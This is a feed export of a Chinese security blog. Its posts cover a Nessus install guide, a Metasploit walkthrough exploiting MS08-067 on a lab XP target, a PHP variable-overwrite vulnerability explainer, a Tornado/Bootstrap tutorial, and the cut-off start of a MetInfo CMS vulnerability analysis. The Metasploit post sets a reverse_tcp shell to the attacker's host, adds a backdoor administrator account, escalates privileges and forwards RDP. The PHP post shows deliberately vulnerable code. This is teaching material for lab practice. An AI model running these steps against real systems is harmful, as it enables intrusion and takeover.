+<p>1、提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库;<br>2、不同于传统的漏洞扫描软件。Nessus可同时在本机或远程控制，进行系统的漏洞分析扫描;<br>3、其运作效能随着系统的资源而自行调整。如果将主机配置更多的资源（如加快CPU速度或增加内存大小），其效率表现可因为丰富资源而提高;<br>4、可自行定义插件;<br>5、NASL（Nessus Attack Scripting Language）是由Tenable所发出的语言，用来写入Nessus的安全测试选项;<br>完全支持SSL（Secure Socket Layer）;</p>
+</blockquote>
+<h3 id="0x02-Nessus-安装"><a href="#0x02-Nessus-安装" class="headerlink" title="0x02 Nessus 安装"></a>0x02 Nessus 安装</h3><p>1.1 获取安装包<br>官网下载：<a href="http://www.tenable.com/products/nessus/select-your-operating-system" target="_blank" rel="external">http://www.tenable.com/products/nessus/select-your-operating-system</a><br><img src="http://p1.bpimg.com/567571/6ec33aad587f3471.png" alt=""><br>可以根据我们自己的需求选择安装包。Nessus有两个版本，分别是Home（家庭版）和Professional（专业版）。这两个版本的区别如下所示：<br>家庭版：家庭版是免费的，主要是供非商业性或个人使用。该版比较适合个人使用，并且可以用于非专业的环境。<br>专业版：专业版是需要付费的。但是，可以免费使用七天。该版主要是供商业人士使用。它包括技术支持或附加功能，如无线并发连接等。<br>对于大部分人来说，家庭版的功能都可以满足。所以，这里选择下载家庭版。在该界面单击Nessus Home下面的Download按钮。<br>1.2 获取激活码<br><a href="http://www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-code" target="_blank" rel="external">http://www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-code</a><br>选择免费的家庭版进行注册。<br><img src="http://p1.bpimg.com/567571/db56dc5804cc5821.png" alt=""><br>在该界面填写一些信息，为了获取激活码。在该界面First Name和Last Name文本框中，用户可以任意填写。但是，Email下的文本框必须填写一个合法的邮件地址，用来获取邮件。当以上信息设置完成后，单击Register按钮。接下来，将会在注册的邮箱中收到一份关于Nessus的邮件。进入邮箱打开收到的邮件，将会看到一串数字，类似XXXX-XXXX-XXXX-XXXX，即激活码。<br><a href="http://www.tenable.com/products/nessus-home" target="_blank" rel="external">http://www.tenable.com/products/nessus-home</a></p>
+<p>1.3 Liunx安装</p>
+<pre><code>dpkg -i Nessus-6.9.1-debian6_amd64.deb   ##安装Nessus
+service nessusd start     ##启动Nessus
+</code></pre><p><img src="http://p1.bpimg.com/567571/38128b3572ee39aa.png" alt=""></p>
+<p><strong>在Linux系统中，Nessus工具默认安装在/opt/nessus目录中。</strong><br>1.4 Nessus启用<br>使用浏览器进行访问，例如，你的IP为192.168.0.179，则浏览器输入<a href="https://192.168.0.179:8834。" target="_blank" rel="external">https://192.168.0.179:8834。</a> <strong>需要注意的是Linux下https协议。</strong><br>首先我们需要注册一个登录名和密码。<br><img src="http://p1.bpimg.com/567571/34a490f3315f95ba.jpg" alt=""><br>接下来就是填写注册码，就是刚才我们邮箱获得的注册码，注意此处选择家庭版。<br><img src="http://p1.bpimg.com/567571/437bbac928385710.jpg" alt=""><br>接下来就是等待安装插件了。<br><img src="http://p1.bpimg.com/567571/a77837b85e6f9b5e.jpg" alt=""><br>成功安装成功进入主页面。<br><img src="http://p1.bqimg.com/567571/1f9a96a8e1a52b78.png" alt=""><br>1.5 可能会出现下载插件出错的情况<br><img src="http://p1.bpimg.com/567571/66303c2cb0d23f96.png" alt=""><br>那么我们可以使用命令行进行更新下载插件</p>
+<pre><code>/opt/nessus/sbin/nessuscli update --plugins-only
+/opt/nessus/sbin/nessuscli update --all 来更新所有（软件更新+插件更新）
+</code></pre><p><img src="http://p1.bpimg.com/567571/b5f6c370711653d6.png" alt=""><br><img src="http://p1.bpimg.com/567571/dfc6556a2e860e3d.png" alt=""></p>
+<p>另外可以使用离线包进行更新安装。<br>离线更新的网址：<br><a href="https://plugins.nessus.org/v2/offline.php" target="_blank" rel="external">https://plugins.nessus.org/v2/offline.php</a><br>需要输入两个信息，一个是challenge code，另一个是activation code 。challenge code获得由/opt/nessus/sbin下的./nessuscli fetch –challenge命令。Activation code由邮件重新获得，之前一个已经被使用过而失效。<br>提交信息获得离线的plugin以及license。统统下载放置到/opt/nessus/sbin下。大小有140+M下载速度奇慢。</p>
+<pre><code>首先导入license。到/opt/nessus/sbin下，执行./nessuscli fetch --register-offline nessus.license
+加载nessus plugins 将all-2.0.tar.gz放到目录下，然后通过nessuscli update all-2.0.tar.gz进行升级 
+</code></pre><p>国内速度比较慢，使用命令更新了好多了才成功了，更新过程可能需要十几分钟吧。</p>
+<p>2.1 Windows安装<br>Windows下比较简单，选择对应的安装包，安装就一直点下一步就行了，注册以及更新就和Linux一样，这里我们就不多介绍了。</p>
+<h3 id="0x03-Nessus配置和使用"><a href="#0x03-Nessus配置和使用" class="headerlink" title="0x03 Nessus配置和使用"></a>0x03 Nessus配置和使用</h3><p>3.1 Nessus配置</p>
+<p>3.2 Nessus扫描<br>首先创建一个扫描，选择一个模板<br><img src="http://p1.bpimg.com/567571/6c229631a09ac3ee.png" alt=""><br>假如现在有一个XP系统，IP 192.168.0.146需要进行扫描的，则配置如下：<br><img src="http://p1.bpimg.com/567571/0314871f662ed476.png" alt=""><br>配置好之后就可以进行扫描了<br><img src="http://p1.bpimg.com/567571/0696b240d9420569.png" alt=""><br>扫描完成后可以查看扫描结果,也可以导出扫描结果。<br><img src="http://p1.bpimg.com/567571/972addeef3888ae1.png" alt=""></p>
+<p>这里看到的只是简单的扫描配置，还有好多的设置和使用方法,还可以创建策略以及设置一些插件。还可以与其他一些工具联合使用，以后的具体用法还会继续学习。<br><strong>生命不息，学习不止！！！</strong></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-Nessus&quot;&gt;&lt;a href=&quot;#0x01-Nessus&quot; class=&quot;headerlink&quot; title=&quot;0x01 Nessus&quot;&gt;&lt;/a&gt;0x01 Nessus&lt;/h3&gt;&lt;p&gt;Nessus号称是世界上最流行的漏洞扫描程序，全世界有超过75000个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus不同于传统的漏洞扫描软件，Nessus可同时在本机或远端上遥控，进行系统的漏洞分析扫描。对应渗透测试人员来说，Nessus是必不可少的工具之一。&lt;br&gt;Nessus通常包括成千上万的最新的漏洞，各种各样的扫描选项，及易于使用的图形界面和有效的报告。Nessus之所以被人们喜爱，是因为该工具具有几个特点。如下所示：
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>基于Metasploit的简单渗透测试</title>
+    <link href="http://yoursite.com/2016/12/08/%E5%9F%BA%E4%BA%8EMetasploit%E7%9A%84%E7%AE%80%E5%8D%95%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    <id>http://yoursite.com/2016/12/08/基于Metasploit的简单渗透测试/</id>
+    <published>2016-12-08T01:41:23.000Z</published>
+    <updated>2016-12-08T02:05:05.904Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x00-Metasploitable"><a href="#0x00-Metasploitable" class="headerlink" title="0x00 Metasploitable"></a>0x00 Metasploitable</h3><p>Metasploitable漏洞演练系统，基于ubuntu、xp操作系统，本身设计作为安全工具测试和演示常见漏洞攻击，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统，可以使我们进行练习。<br>本次测试使用xp系统的靶机，下载地址<br><a href="http://pan.baidu.com/s/1geMxsuJ" target="_blank" rel="external">http://pan.baidu.com/s/1geMxsuJ</a>  密码：xst1</p>
+<h3 id="0x01-查看详细信息"><a href="#0x01-查看详细信息" class="headerlink" title="0x01 查看详细信息"></a>0x01 查看详细信息</h3><p>使用nmap进行探测发现，使用nmap结合脚本进行扫描测试：<br><a id="more"></a><br>    nmap -sT -A –script=smb-check-vulns -P0 192<br>    -sT 使用TCP Connect扫描<br>    -A 是指高级操作系统探测功能，对一个特定服务进行更深的旗标和指纹攫取<br>    –script=smb-check-vulns 调用smb-check-vulns脚本<br>    -P0 进行更深层次的扫描，不进行主机发现.168.0.146</p>
+<p><img src="http://p1.bpimg.com/567571/826753312810080e.png" alt=""><br><img src="http://p1.bpimg.com/567571/7ca9db29aad66a2b.png" alt=""><br>发现探测出MS08-067漏洞，使用Metasploit进行攻击利用。</p>
+<h2 id="0x02-Metasploit的利用"><a href="#0x02-Metasploit的利用" class="headerlink" title="0x02 Metasploit的利用"></a>0x02 Metasploit的利用</h2><p>2.1 查找 MS08-067相关的模块<br><img src="http://p1.bpimg.com/567571/a638f3936515e739.png" alt=""></p>
+<p>2.2 使用选中的模块并查看<br><img src="http://p1.bpimg.com/567571/96be5eca3ce882a7.png" alt=""></p>
+<pre><code>set TARGET 5
+</code></pre><p>2.2 设置攻击参数<br>show options 查看一下参数，确保无误<br>设置PAYLOAD（攻击载荷）<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set RHOST 192.168.1.146 设置远程主机IP地址<br>set LHOST 192.168.1.179 设置反向连接地址为本机IP地址<br>set LPORT 55555 设置本机监听的TCP端口号<br>这个载荷在攻击成功后，会从目标主机发起一个反弹连接，连接到LHOST中指定的IP地址。</p>
+<p><img src="http://p1.bpimg.com/567571/307cb59fc9f7f5d8.png" alt=""></p>
+<p><img src="http://p1.bpimg.com/567571/732dc3a4eae6550e.png" alt=""></p>
+<p>2.3 开始攻击，发现已经上钩；</p>
+<p><img src="http://p1.bpimg.com/567571/ee09a90f249e897a.png" alt=""></p>
+<p><img src="http://p1.bpimg.com/567571/f662c66695f1fc58.png" alt=""></p>
+<h3 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h3><p>3.1 查看权限，判断是否需要进行提权</p>
+<blockquote>
+<p>getuid</p>
+</blockquote>
+<p><img src="http://p1.bqimg.com/567571/5c47668de1bc99a3.png" alt=""></p>
+<p>3.2 增加用户名并设置为管理员</p>
+<blockquote>
+<p>net user zjw 123 /add<br>net localgroup administrators zjw /add</p>
+</blockquote>
+<p><img src="http://p1.bqimg.com/567571/2b949608e42b51eb.png" alt=""><br><img src="http://p1.bqimg.com/567571/2fda087ffd9a4256.png" alt=""><br>3.3 开启3389端口远程登录</p>
+<blockquote>
+<p>run getgui -e </p>
+</blockquote>
+<p><img src="http://p1.bqimg.com/567571/a7728ce712c626d0.png" alt=""><br>3.4 远程连接目标主机</p>
+<blockquote>
+<p>rdesktop -f -a 16 192.168.0.146:3389<br>成功登陆目标主机</p>
+</blockquote>
+<p><img src="http://p1.bqimg.com/567571/bbc3e104976b7066.png" alt=""></p>
+<h3 id="0x04-补充知识"><a href="#0x04-补充知识" class="headerlink" title="0x04 补充知识"></a>0x04 补充知识</h3><p>4.1 拿到shell只是普通用户怎么办？<br>上面演示的直接就是最高权限，当然这种情况在平时渗透测试中也是比较少见的，那么我们就得进行提权了。</p>
+<pre><code>meterpreter &gt; background
+msf exploit(handler) &gt; search ms16
+msf exploit(handler) &gt; use exploit/windows/local/ms16_016_webdav
+msf exploit(ms16_016_webdav) &gt; info
+msf exploit(ms16_016_webdav) &gt; show options
+msf exploit(ms16_016_webdav) &gt; set SESSION 1    # 设置会刚才我们后门连接的ID号 1
+msf exploit(ms16_016_webdav) &gt; exploit
+msf exploit(ms16_016_webdav) &gt; sessions
+msf exploit(ms16_016_webdav) &gt; sessions -i 1
+meterpreter &gt; getuid
+</code></pre><p><img src="http://p1.bpimg.com/567571/a6d950f8675b26b2.jpg" alt=""><br>这是发现我们怎么还是普通权限，我们进行查看进程。然后加载我们的进程号</p>
+<pre><code>meterpreter &gt; ps
+meterpreter &gt; migrate + 进程号
+</code></pre><p><img src="http://p1.bpimg.com/567571/1fb1e2c8eb2603d1.jpg" alt=""><br>这样已经提升为了system权限</p>
+<p>4.2 有时候我们在公网而目标主机在内网如何登陆？<br>这时候就要使用端口转发来实现了，将目标主机的端口转发到我们本机。</p>
+<pre><code>portfwd add -l 你本机的监听端口 -r 127.0.0.1 -p 3389
+</code></pre><p>执行之后所有端口3389的内网流量都会通过这个meterpreter的会话来转发到你kali的127.0.0.1的指定端口上 。<br>假如在这里我设置的监听端口为2222，那么我执行的就是</p>
+<pre><code>portfwd add -l 2222 -r 127.0.0.1 -p 3389
+</code></pre><p>然后开始连接远程桌面。新建一个终端窗口，执行连接Windows远程桌面的命令就OK了。</p>
+<pre><code>rdesktop 127.0.0.1:2222
+</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x00-Metasploitable&quot;&gt;&lt;a href=&quot;#0x00-Metasploitable&quot; class=&quot;headerlink&quot; title=&quot;0x00 Metasploitable&quot;&gt;&lt;/a&gt;0x00 Metasploitable&lt;/h3&gt;&lt;p&gt;Metasploitable漏洞演练系统，基于ubuntu、xp操作系统，本身设计作为安全工具测试和演示常见漏洞攻击，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统，可以使我们进行练习。&lt;br&gt;本次测试使用xp系统的靶机，下载地址&lt;br&gt;&lt;a href=&quot;http://pan.baidu.com/s/1geMxsuJ&quot;&gt;http://pan.baidu.com/s/1geMxsuJ&lt;/a&gt;  密码：xst1&lt;/p&gt;
+&lt;h3 id=&quot;0x01-查看详细信息&quot;&gt;&lt;a href=&quot;#0x01-查看详细信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 查看详细信息&quot;&gt;&lt;/a&gt;0x01 查看详细信息&lt;/h3&gt;&lt;p&gt;使用nmap进行探测发现，使用nmap结合脚本进行扫描测试：&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="Metasploit" scheme="http://yoursite.com/tags/Metasploit/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>变量覆盖</title>
+    <link href="http://yoursite.com/2016/11/30/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
+    <id>http://yoursite.com/2016/11/30/变量覆盖/</id>
+    <published>2016-11-30T13:08:24.000Z</published>
+    <updated>2016-12-03T03:18:01.380Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-变量覆盖"><a href="#0x01-变量覆盖" class="headerlink" title="0x01 变量覆盖"></a>0x01 变量覆盖</h3><p>变量覆盖是指可以用我们自定义的参数值替换程序原有的变量值。变量覆盖漏洞通常需要结合程序的其他功能来实现完整的攻击。<br>变量覆盖漏洞大多由于函数使用不当造成的，经常引发变量覆盖漏洞的函数有extract()函数，parse_str()、import_request_variables()函数在没有开启全局变量注册的时候，调用了这个函数相当于开启了全局变量注册。<br><a id="more"></a></p>
+<h3 id="0x02-变量覆盖函数"><a href="#0x02-变量覆盖函数" class="headerlink" title="0x02 变量覆盖函数"></a>0x02 变量覆盖函数</h3><p>2.1、全局变量覆盖</p>
+<blockquote>
+<p>$GLOBALS, 所有全局变量数组<br>$_SERVER， 服务器环境变量数组<br>$_GET，通过GET方法传递给脚本的变量数组<br>$_POST， 通过POST方法传递给脚本的变量数组<br>$_COOKIE，cookie变量数组<br>$_REQUEST，所有用户输入的变量数组，包括$_GET, $_POST和$_COOKIE所包含的输入内容<br>$_FILES，与文件上传相关得变量数组<br>$_ENV，环境变量数组<br>$_SESSION，会话变量数组</p>
+</blockquote>
+<p>2.1、遍历初始化变量</p>
+<pre><code>&lt;?php
+    $a=&apos;hello&apos;;
+    foreach($_GET as $key =&gt; $value{
+        $$key = $value;
+    }
+ print $a;
+ ?&gt;
+</code></pre><p><img src="http://p1.bqimg.com/567571/283704e0491964bc.png" alt=""><br><strong><em>在代码审计时需要注意类似“$$k”的变量赋值方式有可能覆盖已有的变量，从而导致一些不可控制的结果。</em></strong> </p>
+<p>2.2、parse_str()变量覆盖</p>
+<pre><code>&lt;?php
+$var=&apos;Hello&apos;;
+parse_str($_SERVER[&apos;QUERY_STRING&apos;]);
+print $var;
+?&gt;
+</code></pre><p><img src="http://p1.bqimg.com/567571/b04a08dda72e3da2.png" alt=""><br><strong><em>与parse_str()类似的函数还有mb_parse_str()，parse_str — 将字符串解析成多个变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</em></strong> </p>
+<p>2.3、import_request_variables()变量覆盖</p>
+<pre><code>&lt;?php  
+$a = &apos;0&apos;;  
+import_request_variables(&apos;G&apos;);  
+
+if($a == 1){  
+  echo &quot;true!&quot;;  
+}else{  
+  echo &quot;false!&quot;;  
+}  
+?&gt; 
+</code></pre><p><img src="http://i1.piimg.com/567571/91c711dfdcea3bb8.png" alt=""><br><strong><em>import_request_variables()，将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。</em></strong></p>
+<p>2.4、extract()变量覆盖</p>
+<pre><code>&lt;?php  
+
+$a = &apos;0&apos;;  
+extract($_GET)；  
+
+if($a==1){  
+echo &quot;true!&quot;;  
+}else{  
+echo &quot;false!&quot;;  
+}  
+?&gt; 
+</code></pre><p>假设构造以下链接：<a href="http://www.a.com/1.php?a=1时，界面上会打印出true！" target="_blank" rel="external">http://www.a.com/1.php?a=1时，界面上会打印出true！</a><br>安全的做法是确定register_globals=OFF后，在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖。<br><strong><em>PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</em></strong></p>
+<h3 id="0x03-挖掘经验"><a href="#0x03-挖掘经验" class="headerlink" title="0x03 挖掘经验"></a>0x03 挖掘经验</h3><p>只要搜索敏感函数，然后回溯函数是否可控，当然也可以通过搜索”$$”关键字去挖掘。</p>
+<h3 id="0x04-漏洞防范"><a href="#0x04-漏洞防范" class="headerlink" title="0x04 漏洞防范"></a>0x04 漏洞防范</h3><p>1、<strong>使用原始变量</strong><br>最直接方法就是不进行变量注册，直接使用原生的$_GET、$_POST等数组变量进行操作；<br>2、<strong>验证变量存在</strong><br>注册变量前判断变量是否存在。最重要的一点，自行申明的变量一定要初始化，不然即使注册变量代码在执行流程最前面也能覆盖掉这些未初始化的变量。</p>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="0" height="0" src="http://music.163.com/outchain/player?type=2&id=63650&auto=1&height=66"></iframe>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-变量覆盖&quot;&gt;&lt;a href=&quot;#0x01-变量覆盖&quot; class=&quot;headerlink&quot; title=&quot;0x01 变量覆盖&quot;&gt;&lt;/a&gt;0x01 变量覆盖&lt;/h3&gt;&lt;p&gt;变量覆盖是指可以用我们自定义的参数值替换程序原有的变量值。变量覆盖漏洞通常需要结合程序的其他功能来实现完整的攻击。&lt;br&gt;变量覆盖漏洞大多由于函数使用不当造成的，经常引发变量覆盖漏洞的函数有extract()函数，parse_str()、import_request_variables()函数在没有开启全局变量注册的时候，调用了这个函数相当于开启了全局变量注册。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Tornado+Bootstrap 快速建站</title>
+    <link href="http://yoursite.com/2016/11/29/Tornado-Bootstrap-%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%99/"/>
+    <id>http://yoursite.com/2016/11/29/Tornado-Bootstrap-快速建站/</id>
+    <published>2016-11-29T12:01:01.000Z</published>
+    <updated>2016-11-29T12:11:43.868Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-Tornado"><a href="#0x01-Tornado" class="headerlink" title="0x01 Tornado"></a>0x01 Tornado</h3><p>Tornado是一个用Python写的相对简单的、不设障碍的Web服务器架构,用以处理上万的同时的连接口,让实时的Web服务通畅起来。<br>1、<strong>完整的用以构建网站的基础模块。</strong><br>Tornado包含内置的用以解决网络开发最难和最烦的功能模块，包括模板、signed cookies、用户认证、地方化（localization）、aggressive static file caching, cross-site request forgery protection，以及类似Facebook Connect的第三方认证。开发者可以随取所需，并且自由组合，甚至把Tornado与其他架构组合。 <a id="more"></a><br>2、<strong>实时服务。</strong><br>Tornado支持大量的同时发生的信息连接。用Tornado，能够通过HTTP或者Long Polling方便的书写实时服务。要知道，每一个FriendFeed的活跃用户都保持有一个连通FriendFeed服务器的开放通路。<br>3、<strong>高效能。</strong><br>Tornado比大多数用Python写的Web架构更快。根据一些实验，Tornado的速度是一般架构的4倍。</p>
+<pre><code>pip install tornado  #安装tornado
+</code></pre><p>Tornado内置了自己的HTTPServer，运行和部署它与其他Python web框架不太一样，需要写一个main()函数来启动服务。</p>
+<pre><code>def main():
+  app = make_app()
+  app.listen(8888)
+  IOLoop.current().start()
+
+if __name__ == &apos;__main__&apos;:
+  main()
+</code></pre><p>这里简单的输出一下：</p>
+<pre><code>import tornado.ioloop  
+import tornado.web  
+
+class MainHandler(tornado.web.RequestHandler):  
+    def get(self):  
+        self.write(&quot;Hello, world&quot;)  
+
+application = tornado.web.Application([  
+    (r&quot;/&quot;,MainHandler),  
+])  
+
+if __name__==&quot;__main__&quot;:  
+    application.listen(8888)  
+    tornado.ioloop.IOLoop.instance().start() 
+</code></pre><p>保存为hello.py，当我们运行hello.py时候，我们在浏览器输入127.0.0.1:8888，就可以访问到我们的Hello,world<br><img src="http://p1.bpimg.com/567571/1001f9e6718f691f.png" alt="">       </p>
+<h3 id="0x02-Bootsharp"><a href="#0x02-Bootsharp" class="headerlink" title="0x02 Bootsharp"></a>0x02 Bootsharp</h3><p>目前最受欢迎的前端框架。Bootstrap 是基于 HTML、CSS、JAVASCRIPT 的，它简洁灵活，使得 Web 开发更加快捷。</p>
+<p>2.1、下载代码放入我们的源代码中 <a href="http://getbootstrap.com/" target="_blank" rel="external">传送门</a>，下载已编译的版本<br>2.2、使用CDN，推荐大家使用。</p>
+<pre><code>&lt;!-- 新 Bootstrap 核心 CSS 文件 --&gt;
+&lt;link href=&quot;http://cdn.static.runoob.com/libs/bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;!-- 可选的Bootstrap主题文件（一般不使用） --&gt;
+&lt;script src=&quot;http://cdn.static.runoob.com/libs/bootstrap/3.3.7/css/bootstrap-theme.min.css&quot;&gt;&lt;/script&gt;
+
+&lt;!-- jQuery文件。务必在bootstrap.min.js 之前引入 --&gt;
+&lt;script src=&quot;http://cdn.static.runoob.com/libs/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;!-- 最新的 Bootstrap 核心 JavaScript 文件 --&gt;
+&lt;script src=&quot;http://cdn.static.runoob.com/libs/bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+</code></pre><p> <a href="https://www.staticfile.org/" target="_blank" rel="external">国内推荐使用</a><br> <a href="https://cdnjs.com/" target="_blank" rel="external">国际推荐使用</a>   </p>
+<h3 id="0x03-jQuery"><a href="#0x03-jQuery" class="headerlink" title="0x03 jQuery"></a>0x03 jQuery</h3><p>jQuery 是一个 JavaScript 库,极大地简化了 JavaScript编程。和Bootstrap类似，它也支持两种形式的安装。</p>
+<p>1、可以在官网下载放入源码进行加载 <a href="http://jquery.com/download/" target="_blank" rel="external">传送门</a><br>2、使用CDN</p>
+<pre><code>百度：http://libs.baidu.com/jquery/1.10.2/jquery.min.js
+新浪：http://lib.sinaapp.com/js/jquery/2.0.2/jquery-2.0.2.min.js
+Google：http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js
+</code></pre><h3 id="0x04-将三者结合起来"><a href="#0x04-将三者结合起来" class="headerlink" title="0x04 将三者结合起来"></a>0x04 将三者结合起来</h3><p>Linux下可以使用tree命令查看文件结构。<br>目录结构</p>
+<pre><code>-static      ##主要放置配置文件
+    -css
+    -js
+    -fonts
+    -img
+-templates   ##主要放置页面
+    index.html
+    blog.html
+</code></pre><p><img src="http://p1.bpimg.com/567571/da7fa1b653866611.png" alt=""><br>static目录存放了我们下载的bootsharp的所有文件，下载的jquery.min.js文件也放入对应的js中。<br>总的来说，他的目录结构也相对简单，很好理解。</p>
+<p>最主要的的是编写后端的tornado代码</p>
+<pre><code>import os.path
+
+import tornado.httpserver
+import tornado.ioloop
+import tornado.options
+import tornado.web
+
+from tornado.options import define, options
+define(&quot;port&quot;, default=8000, help=&quot;run on the given port&quot;, type=int)
+
+class LoginHandler(tornado.web.RequestHandler):
+    def get(self):
+        self.render(&apos;login.html&apos;)
+
+if __name__ == &quot;__main__&quot;:
+    tornado.options.parse_command_line()
+    app = tornado.web.Application([(r&quot;/login&quot;,LoginHandler)],
+        template_path = os.path.join(os.path.dirname(__file__),&quot;templates&quot;),
+        static_path =os.path.join(os.path.dirname(__file__), &quot;static&quot;),
+        debug = True                                       
+          )   
+    http_server = tornado.httpserver.HTTPServer(app)
+    http_server.listen(options.port)
+    tornado.ioloop.IOLoop.instance().start()
+</code></pre><p>接下来就是前端的index.thml和login.html的编写<br>在这里需要注意的是由于我们把tornado、bootstrap放到了本地，所以我们采用第一种本地加载的方式，例如：</p>
+<pre><code>加载css:
+&lt;link rel=&quot;stylesheet&quot; href=&quot;{{ static_url("css/bootstrap.min.css") }}&quot;&gt;
+加载js:
+&lt;script src=&quot;{{ static_url("js/bootstrap.min.js") }}&quot;&gt;&lt;/script&gt;
+</code></pre><p>而如果使用CDN的话：</p>
+<pre><code>加载css:
+ &lt;link rel=&quot;stylesheet&quot; href=&quot;http://cdn.static.runoob.com/libs/bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; 
+加载js:
+&lt;script src=&quot;http://cdn.static.runoob.com/libs/bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+</code></pre><p>推荐大家使用CDN的方式去加载。</p>
+<p>这样一个简单地页面就呈现了出来，是不是挺简单啊。其他的网站搭建差不多也是同理。</p>
+<p>这里只是简单的介绍了Tornado、Bootsharp、jQuery相互结合快速建站的思路，至于那些js、css等的语法这里并没有过多的介绍，大家下去可以仔细去了解，推荐搭建菜鸟教程挺不错的。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-Tornado&quot;&gt;&lt;a href=&quot;#0x01-Tornado&quot; class=&quot;headerlink&quot; title=&quot;0x01 Tornado&quot;&gt;&lt;/a&gt;0x01 Tornado&lt;/h3&gt;&lt;p&gt;Tornado是一个用Python写的相对简单的、不设障碍的Web服务器架构,用以处理上万的同时的连接口,让实时的Web服务通畅起来。&lt;br&gt;1、&lt;strong&gt;完整的用以构建网站的基础模块。&lt;/strong&gt;&lt;br&gt;Tornado包含内置的用以解决网络开发最难和最烦的功能模块，包括模板、signed cookies、用户认证、地方化（localization）、aggressive static file caching, cross-site request forgery protection，以及类似Facebook Connect的第三方认证。开发者可以随取所需，并且自由组合，甚至把Tornado与其他架构组合。
+    
+    </summary>
+    
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+      <category term="web前端" scheme="http://yoursite.com/tags/web%E5%89%8D%E7%AB%AF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Metinfo5.3.10 CMS 命令执行 文件包含</title>
+    <link href="http://yoursite.com/2016/11/27/Metinfo5-3-10-CMS-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    <id>http://yoursite.com/2016/11/27/Metinfo5-3-10-CMS-命令执行-文件包含/</id>
+    <published>2016-11-27T14:55:21.000Z</published>
+    <updated>2017-03-14T12:18:45.221Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x00-MetInfo"><a href="#0x00-MetInfo" class="headerlink" title="0x00 MetInfo"></a>0x00 MetInfo</h3><p>MetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。</p>
+<h3 id="0x01-命令执行-文件包含"><a href="#0x01-命令执行-文件包含" class="headerlink" title="0x01 命令执行 文件包含"></a>0x01 命令执行 文件包含</h3><p><strong>命令执行：</strong>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、<br>passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令<br>拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。<br><a id="more"></a><br><strong>文件包含：</strong>由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web server会将特定文件当成php执行，从而导致用户可获取一定的服务器权限。</p>
+<p>此次产生漏洞的版本号为Metinfo5.3.10，源码大家可以下载。</p>
+<h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>文件admin/login/login_check.php：26行</p>
+<pre><code>f($action==&quot;login&quot;){
+   $metinfo_admin_name     = $login_name;
+   $metinfo_admin_pass     = $login_pass;
+   $metinfo_admin_pass=md5($metinfo_admin_pass);
+   /*code*/
+   if($met_login_code==1){
+      require_once $depth.&apos;../include/captcha.class.php&apos;;
+      $Captcha= new  Captcha();
+      if(!$Captcha-&gt;CheckCode($code)){
+     echo(&quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;$lang_logincodeerror&apos;);location.href=&apos;login.php?langset=$langset&apos;;&lt;/script&gt;&quot;);
+     exit;
+  }
+</code></pre><p>   }</p>
